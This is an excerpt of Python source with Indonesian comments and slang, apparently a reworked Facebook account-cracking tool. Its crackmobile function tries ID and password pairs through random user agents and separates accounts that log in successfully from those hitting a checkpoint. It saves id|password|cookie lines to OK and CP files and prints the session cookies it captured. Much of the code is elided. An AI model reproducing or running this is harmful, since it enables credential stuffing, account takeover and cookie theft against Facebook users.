                ...
                if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
                    ...
                    if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
                        ...
                        if 'Sukses!' in str(response6):
                            ...
                            baz_anim(f'{puti}━─═ ◕➤{ung} login berhasil tod jalanin ulang scnya')
                            exit()
                        else:
                            print('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m Gagal...')
    except Exception as e:
        os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
        baz_anim(f'{puti}━─═ ◕➤{hijo} login gagal tod coba ganti tumbal')
        exit()
...
def nge_krek():
	...
	try:
		...
		baz_anim(f'{biru}━─═ ◕➤ temenmu kentod kaga publik')
		exit()
...
def atur_dulu():
	...
	print(f'━─═ ◕➤{ung}SEBATAS RECODE DARI {hijo}SC BASARI')
	print(f'─═ ◕➤ {kun}Rahem bojezz {hijo}perecode {ung}bukan pengocok')
	aturid = input(f'{hijo}━─═ ◕➤: ')
	if aturid in ['1','01']:
...
def crackmobile(idf,pwv):
	...
	global loop,ok,cp
	prog.update(des,description=f'\r{h}REGULER (GRATIS/HASIL SODAKOH) {idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(usragent)
	ses = requests.Session()
...
'bi_xrwh': 0
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{m}🙀🙀🙀😾😾😾{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
				os.poppen('play-audio data/ok.mp3')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				...
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
				os.poppen('play-audio data/cp.mp3')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
